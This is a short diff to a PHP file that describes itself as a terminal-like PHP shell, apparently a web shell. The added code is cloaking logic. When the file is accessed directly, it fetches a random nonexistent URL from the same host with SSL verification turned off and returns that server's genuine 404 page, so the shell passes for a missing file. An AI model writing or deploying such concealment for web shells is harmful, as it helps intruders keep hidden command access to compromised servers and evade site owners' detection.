@@ -4,7 +4,24 @@ if (stristr($_SERVER["REQUEST_URI"], basename(__FILE__))
 || basename($_SERVER['PHP_SELF']) == basename(__FILE__)
 || !defined('VERSION')) 
 {
-    die(http_response_code(404));
+    // Simulate authentic 404 error page
+    $options = [
+        'http' => [
+            'ignore_errors' => true,
+            'header' => "Content-Type: application/json\r\n",
+        ],
+        'ssl' => [
+            'verify_peer' => false,
+            'verify_peer_name' => false
+        ],
+    ];
+    $random_url = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].'/'.bin2hex(random_bytes(16)).'.404';
+    http_response_code(404);
+    if($result = @file_get_contents($random_url, false, stream_context_create($options))) {
+        die($result);
+    } else {
+        exit;
+    }
 }
 /*
  * Single file, terminal like php shell version 0.2.5
